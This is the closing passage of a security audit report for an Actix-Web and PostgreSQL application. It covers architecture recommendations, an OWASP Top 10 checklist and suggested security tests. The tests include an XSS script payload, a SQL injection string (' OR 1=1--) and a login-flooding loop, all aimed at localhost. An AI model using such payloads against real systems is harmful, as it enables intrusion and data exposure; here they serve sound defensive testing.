**Risk:** High - XSS can steal tokens

**Recommended Architecture:**
```
┌─────────────┐         ┌──────────────┐         ┌────────────┐
│   Browser   │◄───────►│  Actix-Web   │◄───────►│ PostgreSQL │
│             │         │              │         │            │
│ - No token  │         │ - Sets       │         │ - Sessions │
│   in JS     │         │   HttpOnly   │         │            │
│ - Cookie    │         │   cookie     │         │            │
│   auto-sent │         │ - Validates  │         │            │
│             │         │   cookie     │         │            │
└─────────────┘         └──────────────┘         └────────────┘
```

**Benefits:**
- Token never accessible to JavaScript (XSS-proof)
- CSRF protection via SameSite attribute
- Automatic cookie expiry
- Refresh token rotation possible

### 2. Error Handling Hierarchy

**Current:** `Box<dyn Error>` everywhere  
**Recommended:** Structured error types

```
AppError
├── DbError
│   ├── Pool
│   ├── Query
│   ├── NotFound
│   └── Constraint
├── AuthError
│   ├── InvalidToken
│   ├── ExpiredToken
│   ├── Unauthorized
│   └── InvalidCredentials
├── ValidationError
│   └── InvalidField(field, reason)
└── InternalError
```

**Benefits:**
- Type-safe error handling
- Consistent error codes for API clients
- No information leakage
- Better monitoring and alerting

### 3. API Request Validation Pipeline

**Recommended flow:**
```rust
Request → Rate Limit → Auth → Validation → Business Logic → Response
          ↓           ↓       ↓           ↓               ↓
          429         401     400         200/4xx/5xx     JSON
```

**Implementation:**
```rust
// Use actix-web extractors with validation
use actix_web_validator::ValidatedJson;

#[post("/items")]
pub async fn create_item(
    _: RateLimitGuard,  // Rate limit check
    auth: AuthGuard,    // Authentication check
    req: ValidatedJson<CreateItemRequest>,  // Auto-validation
    pool: web::Data<Pool>,
) -> Result<impl Responder> {
    // Business logic only deals with validated data
}
```

### 4. Security Monitoring Dashboard

**Recommended Metrics:**
- Failed login attempts per IP
- Rate limit rejections
- Input validation failures
- Admin action audit trail
- Unusual access patterns

**Implementation:**
```rust
// Export metrics for Prometheus/Grafana
use prometheus::{IntCounter, IntGauge};

lazy_static! {
    static ref LOGIN_FAILURES: IntCounter = 
        IntCounter::new("auth_login_failures_total", "Failed login attempts").unwrap();
    
    static ref RATE_LIMIT_REJECTS: IntCounter = 
        IntCounter::new("rate_limit_rejects_total", "Rate limit rejections").unwrap();
}
```

---

## COMPLIANCE CHECKLIST

### OWASP Top 10 2021 Coverage

| Risk | Issue | Status | Findings |
|------|-------|--------|----------|
| A01:2021 – Broken Access Control | Missing rate limiting, no audit log | ⚠️ | #1, #14 |
| A02:2021 – Cryptographic Failures | Weak password policy | ⚠️ | #10 |
| A03:2021 – Injection | SQL LIKE injection | ⚠️ | #7 |
| A04:2021 – Insecure Design | Token in localStorage | ⚠️ | #21 |
| A05:2021 – Security Misconfiguration | No security headers, CORS | ❌ | #2, #3 |
| A06:2021 – Vulnerable Components | Unpinned dependencies | ⚠️ | #24 |
| A07:2021 – Identification & Auth Failures | Weak password, JWT issues | ⚠️ | #10, #15 |
| A08:2021 – Software & Data Integrity | No dependency auditing | ⚠️ | #26 |
| A09:2021 – Security Logging Failures | Unstructured logs, no audit | ⚠️ | #12, #14 |
| A10:2021 – Server-Side Request Forgery | Not applicable | ✅ | N/A |

**Legend:**
- ❌ Critical gap
- ⚠️ Needs improvement
- ✅ Addressed or not applicable

---

## TESTING RECOMMENDATIONS

### Security Tests to Add

1. **Rate Limiting Tests**
```bash
# Test login rate limiting
for i in {1..10}; do
  curl -X POST http://localhost:8210/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"wrong"}' &
done
# Should see 429 Too Many Requests
```

2. **XSS Prevention Tests**
```typescript
// Try to register with malicious username
const xssPayload = '<script>alert("XSS")</script>';
const response = await authApi.register({
  username: xssPayload,
  full_name: 'Test User',
  password: 'ValidPassword123!'
});
// Should be sanitized or rejected
```

3. **SQL Injection Tests**
```bash
# Try SQL injection in search
curl "http://localhost:8210/api/items/search/%27%20OR%201=1--"
# Should not return all items
```

4. **Security Headers Tests**
```bash
# Check security headers
curl -I http://localhost:8210/ | grep -E "X-Frame-Options|X-Content-Type-Options|Content-Security-Policy"
# Should see all headers present
```

---

## NEXT STEPS

1. **Immediate Actions (This Week)**
   - [ ] Review and prioritize findings with team
   - [ ] Set up security-focused branch
   - [ ] Begin Phase 1 implementation

2. **Short Term (This Month)**
   - [ ] Complete Phases 1-2
   - [ ] Add security tests to CI/CD
   - [ ] Document new security policies

3. **Medium Term (This Quarter)**
   - [ ] Complete Phase 3
   - [ ] Set up security monitoring
   - [ ] Third-party security audit

4. **Ongoing**
   - [ ] Weekly dependency updates review
   - [ ] Monthly security scanning
   - [ ] Quarterly penetration testing

---

## REFERENCES

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [Actix-Web Security Best Practices](https://actix.rs/docs/security/)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

**End of Security Audit Report**
